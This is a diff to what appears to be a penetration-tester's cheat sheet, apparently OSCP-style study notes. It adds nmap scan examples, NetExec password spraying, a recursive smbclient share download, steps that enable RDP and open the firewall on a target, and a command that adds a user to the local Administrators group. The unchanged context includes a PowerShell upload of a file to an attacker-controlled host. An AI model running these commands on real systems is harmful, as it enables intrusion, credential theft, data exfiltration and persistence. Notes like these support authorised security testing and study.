@@ -112,6 +112,12 @@ Options:
 
 NSE: http://nmap.org/book/nse.html
 
+Examples:
+```
+sudo nmap -iL ./targets_ext.txt -sU -n -Pn -vvv -oN nmap_all_udp_std.txt
+sudo nmap -vvv -sS -p- -iL ./targets_int.txt -o nmap_internal_allports.txt
+```
+
 #### Windows PowerShell `Test-NetConnection`
 
 ```
@@ -259,4 +265,41 @@ Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt' -pat
 Uploads:
 ```
 powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'interestingfile.txt')
+```
+
+### NetExec
+
+```
+NetExec smb $IP1 $IP2 $IP3 -u ./users.txt -p ./passwords.txt --continue-on-success
+NetExec smb $IP1 $IP2 $IP3 -u someuser -p 'somepass' --shares
+NetExec winrm ...
+```
+
+### Smbclient
+
+Source: https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smb
+```
+smbclient -L \\\\$ip -U 'somedomainnoextension/someuser%somepass'
+smbclient \\\\$ip\\c$ -U 'somedomainnoextension/someuser%somepass'
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *
+```
+
+### RDP
+
+On the target, in PowerShell:
+```
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+In Kali:
+```
+xfreerdp /u:someuser /p:'somepass' /v:$IP /d:somedomnoext
+```
+
+### Administrator, add
+
+```
+Add-LocalGroupMember -Group "Administrators" -Member "someuser"
 ```
